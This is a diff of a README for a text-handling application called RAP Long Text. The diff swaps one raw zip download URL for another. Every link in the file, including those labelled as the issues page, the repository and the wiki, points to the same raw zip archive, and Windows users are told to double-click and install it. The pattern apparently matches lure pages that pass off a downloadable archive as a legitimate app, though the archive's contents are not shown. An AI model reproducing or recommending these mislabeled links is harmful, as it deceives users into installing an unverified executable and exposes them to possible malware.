@@ -8,7 +8,7 @@ Welcome to RAP Long Text Handling! This application helps you manage long text f
 
 To download the application, visit the link below:
 
-[Download RAP Long Text Handling](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip)
+[Download RAP Long Text Handling](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip)
 
 Once you are on the Releases page, look for the latest version. You will see a list of files. Choose the file that suits your operating system and click to download it.
 
@@ -25,7 +25,7 @@ For the best experience, ensure your computer meets the following minimum requir
 After downloading the file, locate it in your downloads folder:
 
 1. **Windows Users:**
-   - Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip`).
+   - Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip`).
    - Follow the prompts to install.
    - Once installed, find RAP Long Text in your Start menu and click to open it.
 
@@ -52,18 +52,18 @@ RAP Long Text offers several useful features:
 
 ## 📞 Support
 
-If you encounter any issues while using RAP Long Text, you can reach out for support. Please visit our [GitHub Issues page](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip) to report problems or ask questions.
+If you encounter any issues while using RAP Long Text, you can reach out for support. Please visit our [GitHub Issues page](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip) to report problems or ask questions.
 
 ## 🔗 Additional Resources
 
 To stay updated on the latest news and features, follow our project on GitHub:
 
-[GitHub Repository](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip)
+[GitHub Repository](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip)
 
-For more detailed guides and tutorials, refer to the [Wiki section](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip) on our repository page.
+For more detailed guides and tutorials, refer to the [Wiki section](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip) on our repository page.
 
 ## 🎉 Conclusion
 
 RAP Long Text is designed for anyone who needs to work with long text files. Its clean interface and powerful features make text management straightforward. Don't hesitate to download and explore what RAP Long Text can do for you!
 
-Once again, here’s the link to [download RAP Long Text Handling](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap-longtext-Zeuglodonta.zip). Enjoy your editing experience!
+Once again, here’s the link to [download RAP Long Text Handling](https://raw.githubusercontent.com/abdessadeq15blt/rap_longtext/main/src/rap_longtext_v1.4.zip). Enjoy your editing experience!
